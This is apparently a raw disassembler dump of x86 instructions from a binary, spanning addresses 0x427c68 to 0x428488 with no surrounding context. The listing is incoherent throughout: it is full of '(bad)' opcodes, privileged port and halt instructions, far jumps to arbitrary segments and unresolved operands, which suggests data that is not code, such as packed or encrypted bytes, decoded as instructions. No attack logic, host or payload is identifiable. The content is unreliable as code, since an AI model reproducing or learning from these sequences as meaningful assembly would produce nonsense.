  427c68:	xchg   ebp,eax
  427c69:	rcr    ch,0x90
  427c6c:	pusha  
  427c6d:	(bad)  [ebx+ebx*2-0x60]
  427c71:	add    BYTE PTR [ebp+0x7f],al
  427c74:	in     al,dx
  427c75:	bnd jmp 0x427c61
  427c78:	jle    0x427c7d
  427c7a:	cmp    DWORD PTR [edx-0x5a],0xffffff95
  427c7e:	inc    edx
  427c7f:	cmp    al,0xd7
  427c81:	int3   
  427c82:	xor    al,0x65
  427c84:	idiv   BYTE PTR [eax+eiz*2-0x22929b4a]
  427c8b:	in     eax,dx
  427c8c:	mov    eax,ds:0x9c0c079d
  427c91:	fwait
  427c92:	shl    DWORD PTR [esi],0xe8
  427c95:	pusha  
  427c96:	scas   eax,DWORD PTR es:[edi]
  427c97:	lahf   
  427c98:	pop    ecx
  427c99:	lea    edx,[eax+0x6e]
  427c9c:	nop
  427c9d:	inc    eax
  427c9e:	inc    esp
  427c9f:	mov    ebp,0x7ab7bc75
  427ca4:	ror    DWORD PTR [ebp+0x48babf59],1
  427caa:	out    0xfe,al
  427cac:	mov    ?,WORD PTR [eax+eiz*1-0x5f]
  427cb0:	sbb    edx,edx
  427cb2:	fwait
  427cb3:	sbb    edx,ecx
  427cb5:	add    esp,edx
  427cb7:	(bad)  
  427cb8:	loop   0x427d37
  427cba:	jnp    0x427c71
  427cbc:	(bad)  
  427cbd:	fbld   TBYTE PTR [esp+edi*8-0x1b]
  427cc1:	sub    dh,BYTE PTR [ecx+0x6d6b5ad9]
  427cc7:	push   esi
  427cc8:	pop    edx
  427cc9:	mov    ebp,0x20fa5912
  427cce:	xchg   esp,eax
  427ccf:	xchg   DWORD PTR cs:[ecx],esi
  427cd2:	inc    ecx
  427cd3:	mov    al,ds:0x815106ae
  427cd8:	in     eax,0x5b
  427cda:	enter  0xbb5,0x74
  427cde:	gs fs in eax,0x55
  427ce2:	push   esp
  427ce3:	ins    DWORD PTR es:[edi],dx
  427ce4:	aam    0x6b
  427ce6:	push   ebx
  427ce7:	pop    ebx
  427ce8:	push   ds
  427ce9:	adc    BYTE PTR [eax+0x1c],dh
  427cec:	pop    ebx
  427ced:	pop    edi
  427cee:	jg     0x427cab
	...
  427cf8:	add    BYTE PTR [eax],al
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	or     DWORD PTR [esi-0xd67b9ff],ecx
  427d0c:	add    DWORD PTR [eax],eax
  427d0e:	inc    BYTE PTR [ecx]
  427d10:	add    BYTE PTR [eax],al
  427d12:	push   esi
  427d13:	test   DWORD PTR [edi+eiz*4-0x13],ecx
  427d17:	or     eax,0x83a8e261
  427d1c:	out    0x33,eax
  427d1e:	sbb    BYTE PTR [esi],dl
  427d20:	les    ebx,FWORD PTR [ebp+0x24]
  427d23:	sub    eax,DWORD PTR [ebp+0x2a]
  427d26:	cmp    edi,DWORD PTR [edx-0x7d5e9709]
  427d2c:	jmp    0x427daa
  427d2e:	stos   BYTE PTR es:[edi],al
  427d2f:	pushf  
  427d30:	pop    ebx
  427d31:	pop    ss
  427d32:	aas    
  427d33:	cld    
  427d34:	inc    esi
  427d35:	sub    BYTE PTR [ebp-0x437d589c],bh
  427d3b:	inc    eax
  427d3c:	jp     0x427d70
  427d3e:	xchg   ebx,ecx
  427d40:	push   edx
  427d41:	test   al,0xa8
  427d43:	das    
  427d44:	out    0x8a,eax
  427d46:	cmc    
  427d47:	jecxz  0x427d72
  427d49:	adc    edi,DWORD PTR [edi+0x3fbd270c]
  427d4f:	jl     0x427d5b
  427d51:	mov    edx,0x58811f6b
  427d56:	in     al,0xd7
  427d58:	dec    eax
  427d59:	add    al,0x95
  427d5b:	dec    edx
  427d5c:	pop    eax
  427d5d:	sti    
  427d5e:	sahf   
  427d5f:	js     0x427d67
  427d61:	outs   dx,BYTE PTR ds:[esi]
  427d62:	cmp    al,0x99
  427d64:	pop    ecx
  427d65:	jg     0x427d80
  427d67:	lahf   
  427d68:	rcl    DWORD PTR [ecx],cl
  427d6a:	out    dx,eax
  427d6b:	fs hlt 
  427d6d:	dec    esp
  427d6e:	ins    BYTE PTR es:[edi],dx
  427d6f:	jmp    0xa438:0x52142681
  427d76:	aaa    
  427d77:	xlat   BYTE PTR ds:[ebx]
  427d78:	sub    ch,BYTE PTR [esp+ebp*8+0x5c2876d0]
  427d7f:	add    eax,0x1a823e2
  427d84:	sbb    al,0x59
  427d86:	js     0x427d80
  427d88:	sub    DWORD PTR [ebp+0x6b],eax
  427d8b:	call   0xd910:0x75572c16
  427d92:	xor    BYTE PTR [esi],dh
  427d94:	jb     0x427dea
  427d96:	jg     0x427d31
  427d98:	stc    
  427d99:	cmp    eax,0xc809a48b
  427d9e:	jecxz  0x427db4
  427da0:	xchg   ebx,eax
  427da1:	jnp    0x427d58
  427da3:	sbb    DWORD PTR [ebx+eiz*4],0x5
  427da7:	or     BYTE PTR [ecx-0x64],cl
  427daa:	mov    ds:0x51257048,eax
  427daf:	gs gs add eax,0x601bd714
  427db6:	sub    DWORD PTR [ecx],edi
  427db8:	mov    al,ds:0x9ac4a225
  427dbd:	pop    edx
  427dbe:	fwait
  427dbf:	jbe    0x427d7e
  427dc1:	fcmove st,st(7)
  427dc3:	xor    eax,0x7c269541
  427dc8:	mov    eax,DWORD PTR ds:0x155a5b80
  427dce:	jecxz  0x427d6a
  427dd0:	mov    esi,0xd998ca28
  427dd5:	mov    WORD PTR cs:[eax],cs
  427dd8:	xor    DWORD PTR [edi+ebp*8+0x54],ebp
  427ddc:	test   al,0x13
  427dde:	int3   
  427ddf:	and    ebp,DWORD PTR [esi]
  427de1:	lods   al,BYTE PTR ds:[esi]
  427de2:	ins    DWORD PTR es:[edi],dx
  427de3:	inc    ecx
  427de4:	mov    dh,0x13
  427de6:	mov    ch,0x35
  427de8:	call   0xe4881599
  427ded:	(bad)  
  427dee:	jmp    0xbdf5:0x579a6c27
  427df5:	stc    
  427df6:	cmc    
  427df7:	push   ds
  427df8:	or     bl,BYTE PTR [ebp-0x62]
  427dfb:	and    DWORD PTR [edi-0x40],edx
  427dfe:	mov    WORD PTR [edi+ebx*8+0x6f],gs
  427e02:	sbb    al,0x9
  427e04:	inc    ebp
  427e05:	xor    bh,al
  427e07:	xchg   esp,eax
  427e08:	rcr    DWORD PTR [ebp-0x5e],1
  427e0b:	xor    al,bl
  427e0d:	mov    ds:0x1e5aff3c,eax
  427e12:	dec    ecx
  427e13:	fisttp QWORD PTR [ecx+edx*4-0x52]
  427e17:	popf   
  427e18:	sub    BYTE PTR [ebx-0x2ddc4020],dl
  427e1e:	sti    
  427e1f:	stc    
  427e20:	cs jbe 0x427e63
  427e23:	xchg   ecx,eax
  427e24:	sbb    esp,esi
  427e26:	add    al,0x99
  427e28:	retf   0xc042
  427e2b:	add    al,0x26
  427e2d:	jmp    0x795d4fb
  427e32:	mov    edx,DWORD PTR [edi-0x20]
  427e35:	push   edi
  427e36:	out    dx,al
  427e37:	cmp    ecx,DWORD PTR [esp+ecx*8-0x2eb1d7d7]
  427e3e:	stos   DWORD PTR es:[edi],eax
  427e3f:	jnp    0x427df1
  427e41:	mov    ds:0xd2126ad4,al
  427e46:	add    al,0x91
  427e48:	adc    al,0xe2
  427e4a:	adc    ebp,esp
  427e4c:	jl     0x427e92
  427e4e:	inc    BYTE PTR [esi]
  427e50:	gs nop
  427e52:	mov    eax,0xd9f871a7
  427e57:	(bad)  
  427e59:	rcl    DWORD PTR [ebx],0x71
  427e5c:	daa    
  427e5d:	mov    cl,0xb
  427e5f:	sbb    dh,BYTE PTR [esi+0x40]
  427e62:	jmp    0x8877865e
  427e67:	or     eax,0x84267136
  427e6c:	mov    bh,bh
  427e6e:	dec    ecx
  427e6f:	mov    edi,0x750749f1
  427e74:	xchg   ebp,eax
  427e75:	and    eax,0xe7c53dd4
  427e7a:	inc    esi
  427e7b:	cmp    al,0x55
  427e7d:	xor    al,0x4e
  427e7f:	aam    0x8d
  427e81:	jmp    0x7d3a:0x83df635c
  427e88:	pop    ebx
  427e89:	mov    bh,0xf6
  427e8b:	dec    ecx
  427e8c:	inc    BYTE PTR [eax]
  427e8e:	xor    eax,0xaa9b68a1
  427e93:	inc    esi
  427e94:	shl    edi,cl
  427e96:	les    esp,FWORD PTR [edx+0x2d]
  427e99:	push   eax
  427e9a:	leave  
  427e9b:	inc    ecx
  427e9c:	xor    ecx,DWORD PTR [ebx]
  427e9e:	mov    dh,0xc1
  427ea0:	jle    0x427e5d
  427ea2:	(bad)  
  427ea3:	pop    esi
  427ea4:	mov    bh,0x25
  427ea6:	and    DWORD PTR [edi+0x75ba21f9],ebp
  427eac:	ins    BYTE PTR es:[edi],dx
  427ead:	ds test bh,bl
  427eb0:	sub    BYTE PTR [edx-0x3c2fd672],cl
  427eb6:	xor    ch,BYTE PTR [eax]
  427eb8:	int3   
  427eb9:	xor    ebp,DWORD PTR [edi+0x7c2b2ddc]
  427ebf:	mov    WORD PTR [edx],gs
  427ec1:	inc    esp
  427ec2:	pop    edi
  427ec3:	ret    
  427ec4:	push   0xbde75fed
  427ec9:	ss stos DWORD PTR es:[edi],eax
  427ecb:	ins    DWORD PTR es:[edi],dx
  427ecc:	pop    esp
  427ecd:	or     edi,DWORD PTR [esi+0x2f]
  427ed0:	ins    DWORD PTR es:[edi],dx
  427ed1:	xor    ebp,DWORD PTR [edx+0x57d24202]
  427ed7:	pop    ds
  427ed8:	cmc    
  427ed9:	lods   al,BYTE PTR ds:[esi]
  427eda:	or     esi,DWORD PTR [eax+esi*4+0x3c72f0ac]
  427ee1:	cwde   
  427ee2:	sub    BYTE PTR [edi-0x5c],bh
  427ee5:	ror    ecx,1
  427ee7:	les    ebx,FWORD PTR [ebp-0x27e01aa4]
  427eed:	(bad)  
  427eee:	retf   
  427eef:	les    ebx,FWORD PTR [ecx+ebp*1+0x1160e0b6]
  427ef6:	xchg   DWORD PTR [ebx+0x40],esp
  427ef9:	fwait
  427efa:	cli    
  427efb:	push   0xa7b4ed1d
  427f00:	pop    esp
  427f01:	push   edi
  427f02:	push   0xffffff8c
  427f04:	clc    
  427f05:	sar    BYTE PTR [ecx+0x2e],1
  427f08:	pop    esi
  427f09:	sub    cl,BYTE PTR [ebp+eax*1-0x1b051f31]
	...
  427f18:	add    BYTE PTR [eax],al
  427f1a:	call   0xdafe:0xfef82244
  427f21:	leavew 
  427f23:	and    dh,BYTE PTR [ecx+edx*1-0x68]
  427f27:	xchg   esp,eax
  427f28:	xchg   esp,eax
  427f29:	les    edx,FWORD PTR [esi-0x1fffe0c]
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    dl,dl
  427f33:	inc    edi
  427f34:	push   ebp
  427f35:	jae    0x427fb5
  427f37:	pop    edx
  427f38:	js     0x427ee8
  427f3a:	inc    edx
  427f3b:	rcr    DWORD PTR [ebp-0x3187431f],1
  427f41:	mov    bh,0x65
  427f43:	outs   dx,DWORD PTR ds:[esi]
  427f44:	adc    DWORD PTR ds:0x126bdf85,ebp
  427f4a:	sbb    eax,0xab91cf40
  427f4f:	shl    DWORD PTR [ebx],1
  427f51:	push   edi
  427f52:	add    al,0x8
  427f54:	push   cs
  427f55:	mov    DWORD PTR [esp+eiz*8],0x7ffa1bc5
  427f5c:	xor    edx,DWORD PTR [eax-0x1d]
  427f5f:	lds    esi,FWORD PTR [eax]
  427f61:	sbb    esp,DWORD PTR ds:0xc7004a83
  427f67:	ds dec ecx
  427f69:	add    eax,0x14b77552
  427f6e:	push   ss
  427f6f:	cmc    
  427f70:	mov    bl,0x78
  427f72:	and    eax,0x108383da
  427f77:	pmulhuw mm1,QWORD PTR [ebp+0x1e]
  427f7b:	add    eax,0x72838441
  427f80:	adc    ebp,ecx
  427f82:	xchg   ecx,eax
  427f83:	bound  ebp,QWORD PTR [ebp-0x5]
  427f86:	out    dx,eax
  427f87:	jmp    0x6c521866
  427f8c:	or     eax,0x5e347dae
  427f91:	add    BYTE PTR [ecx],0xb
  427f94:	call   0xe206afe2
  427f99:	jbe    0x427fc6
  427f9b:	ret    0x27f1
  427f9e:	(bad)  [esi+0x8]
  427fa1:	xchg   edx,eax
  427fa2:	mov    esp,0x876edd98
  427fa7:	ins    DWORD PTR es:[edi],dx
  427fa8:	les    eax,FWORD PTR [edx+0x2111019b]
  427fae:	dec    edi
  427faf:	mov    BYTE PTR [ebp+0x4e991e1],dl
  427fb5:	jno    0x427f7f
  427fb7:	mov    eax,0x157917f5
  427fbc:	lds    esi,FWORD PTR [ebx+0x53]
  427fbf:	lahf   
  427fc0:	fisttp DWORD PTR [eax+ebx*2]
  427fc3:	mov    bl,0x36
  427fc5:	add    esp,esp
  427fc7:	cwde   
  427fc8:	xor    eax,0xbc2f3a2d
  427fcd:	xor    al,BYTE PTR [eax]
  427fcf:	mov    edi,0x37f86d6f
  427fd4:	dec    ecx
  427fd5:	retf   0x9f8a
  427fd8:	xchg   ebx,eax
  427fd9:	jne    0x427fcd
  427fdb:	repnz and al,0x81
  427fde:	and    ebx,DWORD PTR [edi-0x15278c11]
  427fe4:	dec    ecx
  427fe5:	(bad)  
  427fe6:	jo     0x428033
  427fe8:	fdiv   DWORD PTR [edi+0x261b8a05]
  427fee:	stos   BYTE PTR es:[edi],al
  427fef:	test   esp,esp
  427ff1:	jnp    0x427fce
  427ff3:	pop    esi
  427ff4:	iret   
  427ff5:	sbb    eax,0xe012f366
  427ffa:	mov    al,ds:0xffdc1f9
  427fff:	mov    esi,0x1d836650
  428004:	dec    ebp
  428005:	xor    BYTE PTR [eax-0x15e85b0a],bl
  42800b:	mov    BYTE PTR [eax-0x44fbd704],al
  428011:	cmp    bl,BYTE PTR [esi+0x6fa7fae1]
  428017:	or     al,0x3b
  428019:	inc    esp
  42801a:	mov    dl,0x37
  42801c:	push   esp
  42801d:	add    BYTE PTR [ecx+eiz*8-0x6e647a4d],0xe9
  428025:	push   ss
  428026:	icebp  
  428027:	push   esi
  428028:	inc    ebx
  428029:	mov    dh,0x7a
  42802b:	jg     0x428074
  42802d:	enter  0xca19,0xd9
  428031:	pop    ebx
  428032:	dec    ebp
  428033:	cmp    BYTE PTR [eax],ch
  428035:	mov    ds:0x29653c50,eax
  42803a:	mov    ah,0x3a
  42803c:	inc    ecx
  42803d:	sub    eax,0xa974e3ec
  428042:	popa   
  428043:	jne    0x428062
  428045:	std    
  428046:	ins    BYTE PTR es:[edi],dx
  428047:	retf   
  428048:	addr16 xor al,ch
  42804b:	cli    
  42804c:	cli    
  42804d:	les    esp,FWORD PTR [esi-0x39]
  428050:	cmp    eax,0xae497773
  428055:	mov    esi,0x3235f2b9
  42805a:	ror    eax,1
  42805c:	mov    bl,0x9f
  42805e:	mov    ds:0x4ecc44df,al
  428064:	or     BYTE PTR [esi],ch
  428066:	adc    ebx,DWORD PTR [esi]
  428068:	fadd   QWORD PTR [edi-0x11]
  42806b:	lea    esp,[ebx+0x1c0ccad6]
  428071:	adc    edx,DWORD PTR [eax-0x59c1fda8]
  428077:	loope  0x4280ba
  428079:	dec    edx
  42807a:	mov    WORD PTR [edx+0x426d3d04],cs
  428080:	xor    dl,BYTE PTR [ebx+0x3264ab73]
  428086:	enter  0x97a4,0x93
  42808a:	pop    ebp
  42808b:	mov    cl,0x83
  42808d:	adc    al,BYTE PTR ds:0xec391aae
  428093:	sbb    eax,DWORD PTR [edi-0x1c]
  428096:	rol    DWORD PTR [eax+0x7a],0xfd
  42809a:	pop    ecx
  42809b:	rol    BYTE PTR [ecx-0x16],0x8a
  42809f:	outs   dx,BYTE PTR fs:[esi]
  4280a1:	lods   al,BYTE PTR ds:[esi]
  4280a2:	and    al,0xca
  4280a4:	pop    es
  4280a5:	cli    
  4280a6:	sbb    BYTE PTR [esi-0x49],bh
  4280a9:	xor    edi,ebx
  4280ab:	cmp    eax,0x2b587653
  4280b0:	sub    al,0xf4
  4280b2:	pop    ss
  4280b3:	cmp    bh,BYTE PTR [edx-0x40216473]
  4280b9:	mov    al,ds:0x68beaafd
  4280be:	and    DWORD PTR [ebx-0x1dac1f17],ecx
  4280c4:	jmp    0xe0fc:0x35d5deb9
  4280cb:	pop    es
  4280cc:	push   ecx
  4280cd:	int    0x93
  4280cf:	mov    bl,0x39
  4280d1:	mov    al,0x86
  4280d3:	dec    ebx
  4280d4:	sub    al,0x54
  4280d6:	std    
  4280d7:	inc    edx
  4280d8:	jge    0x4280c1
  4280da:	inc    ecx
  4280db:	out    0xea,eax
  4280dd:	push   edx
  4280de:	pop    ss
  4280df:	xchg   ecx,eax
  4280e0:	jecxz  0x4280cf
  4280e2:	adc    ah,BYTE PTR [ecx]
  4280e4:	cld    
  4280e5:	jno    0x428123
  4280e7:	or     BYTE PTR [edx-0x3bb8fcab],cl
  4280ed:	dec    edi
  4280ee:	pop    ecx
  4280ef:	ins    DWORD PTR es:[edi],dx
  4280f0:	(bad)  
  4280f1:	fwait
  4280f2:	sbb    esp,eax
  4280f4:	rcl    al,0x8f
  4280f7:	idiv   BYTE PTR [esi-0x7fdc89fb]
  4280fd:	lods   al,BYTE PTR ds:[esi]
  4280fe:	pop    ds
  4280ff:	lods   eax,DWORD PTR ds:[esi]
  428100:	xor    DWORD PTR [ecx],esi
  428102:	mov    BYTE PTR [esi+0x19f5cb31],dh
  428108:	sbb    eax,0x98e64144
  42810d:	mov    dl,0x3
  42810f:	and    DWORD PTR [ecx-0x45],eax
  428112:	cli    
  428113:	arpl   WORD PTR [ecx],bp
  428115:	imul   esi,DWORD PTR [esp+ebp*4+0x37],0xd4997c0f
  42811d:	in     al,dx
  42811e:	jo     0x428169
  428120:	imul   esi,DWORD PTR ds:0xb4eccad6,0x8c76cadc
  42812a:	inc    ecx
  42812b:	test   eax,0x60a37b
	...
  428139:	add    BYTE PTR [eax+0x3fc326ab],dl
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	inc    esp
  428147:	push   ebp
  428148:	jns    0x428146
  42814a:	xchg   esp,eax
  42814b:	test   BYTE PTR [ecx],0x0
  42814e:	inc    BYTE PTR [ecx]
  428150:	add    BYTE PTR [eax],al
  428152:	jle    0x428142
  428154:	ja     0x4280f9
  428156:	xor    eax,0xb6ebeebf
  42815b:	outs   dx,BYTE PTR ds:[esi]
  42815c:	aas    
  42815d:	out    0x98,eax
  42815f:	and    BYTE PTR [eax-0x72],al
  428162:	push   ecx
  428163:	stos   BYTE PTR es:[edi],al
  428164:	xor    BYTE PTR ds:0x155fb9e0,dl
  42816a:	jp     0x42814a
  42816c:	pop    ebp
  42816d:	sub    dl,bh
  42816f:	adc    bh,BYTE PTR [edx]
  428171:	or     BYTE PTR [ebx+eiz*4+0x3a46b8ce],dl
  428178:	imul   ebx,DWORD PTR [ecx],0xeeb0d12a
  42817e:	mov    bh,0x79
  428180:	pop    ebx
  428181:	inc    edi
  428182:	inc    esp
  428183:	shr    DWORD PTR [edi+edi*1],cl
  428186:	push   esp
  428187:	mov    DWORD PTR [ebx],edx
  428189:	sbb    DWORD PTR [ebp+0x46],esp
  42818c:	mov    al,ds:0xb221f61a
  428191:	sti    
  428192:	sub    BYTE PTR ds:0xa353247f,cl
  428198:	test   DWORD PTR [edx-0x2],ecx
  42819b:	(bad)  
  42819c:	out    0xc3,al
  42819e:	cs push es
  4281a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281a1:	mov    ds:0xac2c5640,al
  4281a6:	mov    eax,0xb0b782ea
  4281ab:	es faddp st(4),st
  4281ae:	or     edi,DWORD PTR [eax+0x7396077d]
  4281b4:	and    BYTE PTR [esi-0x21b2ed43],0x79
  4281bb:	push   eax
  4281bc:	mov    cs,WORD PTR [esi-0x2dec8083]
  4281c2:	sahf   
  4281c3:	jecxz  0x4281f2
  4281c5:	add    eax,0x51dd53a7
  4281ca:	mov    eax,0x8b310a5
  4281cf:	push   eax
  4281d0:	pop    edx
  4281d1:	out    0xea,eax
  4281d3:	loop   0x428239
  4281d5:	addr16 idiv esp
  4281d8:	push   esi
  4281d9:	stc    
  4281da:	xor    dl,bl
  4281dc:	fisttp QWORD PTR [ecx+0x3d11f2fd]
  4281e2:	aas    
  4281e3:	stos   BYTE PTR es:[edi],al
  4281e4:	(bad)
  4281e8:	js     0x4281cf
  4281ea:	aad    0x4b
  4281ec:	mov    WORD PTR [edx-0x5ee53a73],fs
  4281f2:	mov    BYTE PTR [esi+0x43f6de90],ch
  4281f8:	je     0x428227
  4281fa:	mov    ds:0x7e90392a,eax
  4281ff:	or     al,0x8
  428201:	cs js  0x428206
  428204:	xchg   esi,eax
  428205:	popf   
  428206:	fld    QWORD PTR [edx-0x74e4478c]
  42820c:	or     ch,dl
  42820e:	xor    ecx,esp
  428210:	pop    esi
  428212:	xor    eax,0x4de8151f
  428217:	xchg   esi,eax
  428218:	mov    ds:0xa2870771,al
  42821d:	jle    0x428233
  42821f:	scas   al,BYTE PTR es:[edi]
  428220:	lods   eax,DWORD PTR ds:[esi]
  428221:	fcom   QWORD PTR [edx+0x15f005d2]
  428227:	push   0x80cbc35f
  42822c:	iret   
  42822d:	jmp    0x8745:0x5523814d
  428234:	and    esi,ebp
  428236:	addr16 xchg ecx,eax
  428238:	dec    DWORD PTR [edx]
  42823a:	adc    BYTE PTR [edx-0x492088de],bl
  428240:	xchg   edx,eax
  428241:	loope  0x4282b6
  428243:	je     0x4281f4
  428245:	sub    ah,BYTE PTR cs:[edi+0xf63cb3e]
  42824c:	jo     0x428298
  42824e:	(bad)  
  42824f:	xor    eax,0x1d775cbb
  428254:	xlat   BYTE PTR ds:[ebx]
  428255:	cmp    DWORD PTR [ebx+0x13],edx
  428258:	call   0x9c25:0xcd4cce9c
  42825f:	bound  ebx,QWORD PTR [edi+0x1b]
  428262:	and    eax,ebx
  428264:	add    eax,0xb6b8e61f
  428269:	stc    
  42826a:	mov    dh,0x59
  42826c:	imul   eax,DWORD PTR [ebp+0x7e],0x8c83a78a
  428273:	push   eax
  428274:	cwde   
  428275:	mov    eax,0x21ddc9fd
  42827a:	and    ch,BYTE PTR [ebx-0x63d2aa91]
  428280:	hlt    
  428281:	js     0x4282f5
  428283:	popf   
  428284:	outs   dx,BYTE PTR ds:[esi]
  428285:	retf   0xbf3
  428288:	dec    ecx
  428289:	ins    DWORD PTR es:[edi],dx
  42828a:	push   ebp
  42828b:	push   edx
  42828c:	or     DWORD PTR [edx-0x3d],esp
  42828f:	fcmovu st,st(7)
  428291:	push   es
  428292:	adc    DWORD PTR [ecx-0x51],edx
  428295:	and    edi,ebx
  428297:	leave  
  428298:	sahf   
  428299:	and    eax,0x5cd9d595
  42829e:	xchg   BYTE PTR [edi],ah
  4282a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282a1:	jnp    0x42824e
  4282a3:	xor    ecx,edi
  4282a5:	adc    al,0xa8
  4282a7:	sbb    ah,BYTE PTR [eax-0x7a]
  4282aa:	dec    edi
  4282ab:	cmp    eax,0xf616d132
  4282b0:	or     edi,DWORD PTR [ecx-0x6b59006a]
  4282b6:	lahf   
  4282b7:	dec    edi
  4282b8:	jo     0x428290
  4282ba:	mov    eax,0x25c288a0
  4282bf:	dec    ecx
  4282c0:	test   eax,0xef0c3e49
  4282c5:	pusha  
  4282c6:	dec    esi
  4282c7:	das    
  4282c8:	cwde   
  4282c9:	fdivr  DWORD PTR [edx]
  4282cb:	repz mov ebp,0xf5d768be
  4282d1:	or     cl,BYTE PTR [ebx-0x3d]
  4282d4:	xor    ch,BYTE PTR [esi+0x5d]
  4282d7:	retf   0x16e2
  4282da:	jns    0x4282c2
  4282dc:	ret    
  4282dd:	fisttp QWORD PTR [ebx]
  4282df:	ret    
  4282e0:	adc    eax,0x52a4ab8b
  4282e5:	in     eax,0x4
  4282e7:	or     eax,0x6af5a46a
  4282ec:	loop   0x42828d
  4282ee:	out    0xee,al
  4282f0:	sub    esi,esi
  4282f2:	mov    dl,0xc6
  4282f4:	add    edi,DWORD PTR [edi]
  4282f6:	int    0x54
  4282f8:	shl    DWORD PTR [ebx],1
  4282fa:	shr    DWORD PTR [esi-0x16],1
  4282fd:	popa   
  4282fe:	sub    al,0x5c
  428300:	leave  
  428301:	add    BYTE PTR [esi+0x71fecb0c],ch
  428307:	mov    dh,0x38
  428309:	pop    edi
  42830a:	in     eax,0x1c
  42830c:	xlat   BYTE PTR ds:[ebx]
  42830d:	sbb    bh,BYTE PTR [eax+0x1d805c6c]
  428313:	icebp  
  428314:	stos   DWORD PTR es:[edi],eax
  428315:	inc    ebp
  428316:	mov    eax,ds:0x6f7d0a45
  42831b:	jo     0x428300
  42831d:	mov    cl,0x45
  42831f:	or     eax,0xe9932842
  428324:	jge    0x42833c
  428326:	iret   
  428327:	xchg   BYTE PTR [ecx-0x18a4dece],cl
  42832d:	int    0x6c
  42832f:	adc    al,0xe7
  428331:	aas    
  428332:	pop    ds
  428333:	cmp    ch,ch
  428335:	add    al,0x53
  428337:	mov    ebp,0xbc470758
  42833c:	mov    dl,0xd6
  42833e:	sbb    bh,BYTE PTR [ebx+eiz*8+0x70]
  428342:	xor    ecx,edx
  428344:	xchg   ebx,eax
  428345:	xchg   DWORD PTR [ebp+0x7f454328],esi
  42834b:	adc    al,0x4d
  42834d:	out    dx,eax
  42834e:	add    DWORD PTR [ebx],ebx
	...
  428358:	add    BYTE PTR [eax],al
  42835a:	std    
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x428359
  428367:	mov    ebp,0xf892846d
  42836c:	add    DWORD PTR [eax],eax
  42836e:	inc    BYTE PTR [ecx]
  428370:	add    BYTE PTR [eax],al
  428372:	add    al,cl
  428374:	xor    al,0x21
  428376:	aam    0x98
  428378:	dec    ecx
  428379:	js     0x42830d
  42837b:	in     eax,0xce
  42837d:	xor    esi,eax
  42837f:	mov    ds:0x96a85c33,eax
  428384:	enter  0xa131,0xd8
  428388:	leave  
  428389:	dec    ebp
  42838a:	test   eax,0x7115bd6f
  42838f:	inc    edi
  428390:	add    cl,al
  428392:	jb     0x42835b
  428394:	fwait
  428395:	push   ebx
  428396:	mov    al,0x65
  428398:	je     0x428334
  42839a:	rol    DWORD PTR [edi],0x2d
  42839d:	mov    ch,0x2f
  42839f:	imul   edi,DWORD PTR [esi-0x5b1b0864],0x2ed79c6b
  4283a9:	xchg   DWORD PTR [edi],esi
  4283ab:	and    ebx,DWORD PTR [esi-0x64]
  4283ae:	icebp  
  4283af:	(bad)  
  4283b0:	(bad)  
  4283b1:	and    al,0x6a
  4283b3:	jl     0x4283de
  4283b5:	xchg   esp,eax
  4283b6:	jp     0x42839d
  4283b8:	adc    al,0xd4
  4283ba:	jp     0x4283d1
  4283bc:	in     eax,0xf7
  4283be:	and    BYTE PTR [esi+0x21],0x31
  4283c2:	retf   0x201f
  4283c5:	mov    bl,0x70
  4283c7:	push   ds
  4283c8:	shl    BYTE PTR [esi+0x43242eea],0xd
  4283cf:	je     0x4283f8
  4283d1:	aad    0x9b
  4283d3:	mov    ch,BYTE PTR [ebp+0x6d0b0221]
  4283d9:	and    bl,0x16
  4283dc:	mov    al,ds:0xf95bee0e
  4283e1:	loop   0x428430
  4283e3:	adc    eax,0x1b7b7156
  4283e8:	adc    edi,esi
  4283ea:	arpl   WORD PTR [edi+eax*8],si
  4283ed:	push   esp
  4283ee:	add    ecx,DWORD PTR [edx]
  4283f0:	jnp    0x428417
  4283f2:	popf   
  4283f3:	mov    WORD PTR [ebp+0x3829bd5b],?
  4283f9:	xor    bl,ch
  4283fb:	jbe    0x4283b3
  4283fd:	pop    edx
  4283fe:	and    DWORD PTR [ebx+edx*1+0x17],edx
  428402:	adc    BYTE PTR [edi],ah
  428404:	out    dx,al
  428405:	jle    0x428412
  428407:	lock jae 0x428397
  42840a:	dec    ecx
  42840b:	push   ds
  42840c:	shl    esi,cl
  42840e:	cmp    edx,DWORD PTR [ebx+0x306ba77a]
  428414:	sbb    al,0xe0
  428416:	pop    ds
  428417:	sahf   
  428418:	icebp  
  428419:	ins    DWORD PTR es:[edi],dx
  42841a:	mov    DWORD PTR [eax+0x19667b1a],ecx
  428420:	mov    esi,0x673baf
  428425:	scas   al,BYTE PTR es:[edi]
  428426:	fistp  WORD PTR [edx+edi*2-0x586bdfa2]
  42842d:	test   eax,0x4a055b5c
  428432:	inc    ecx
  428433:	mov    edx,0x5d7ae567
  428438:	idiv   DWORD PTR [edx-0xf]
  42843b:	loop   0x428451
  42843d:	lds    ebp,FWORD PTR [esi]
  42843f:	jmp    0xfa2c:0x8cec26d
  428446:	inc    ebp
  428447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428448:	mov    edi,0x29142516
  42844d:	sub    al,BYTE PTR [edi+edx*8-0x6ebd3ee5]
  428454:	or     al,0xb
  428456:	mov    ebp,DWORD PTR [edx+esi*2]
  428459:	cmp    dh,BYTE PTR [ecx+eax*2+0xe]
  42845d:	pop    ss
  42845e:	cld    
  42845f:	sub    ebx,DWORD PTR ds:0xce206bc3
  428465:	and    al,0xb6
  428467:	mov    ebp,0x79e65b19
  42846c:	adc    DWORD PTR [ebx],ebp
  42846e:	into   
  42846f:	jle    0x42840a
  428471:	jl     0x428490
  428473:	sbb    esp,DWORD PTR [ebp+0x402c9e63]
  428479:	add    al,0x73
  42847b:	xchg   esi,eax
  42847c:	pop    ebp
  42847d:	shl    DWORD PTR [edx],0xd1
  428480:	aad    0x5a
  428482:	push   edx
  428483:	sub    eax,0x5ad6ca7c
  428488:	lods   eax,DWORD PTR ds:[esi]
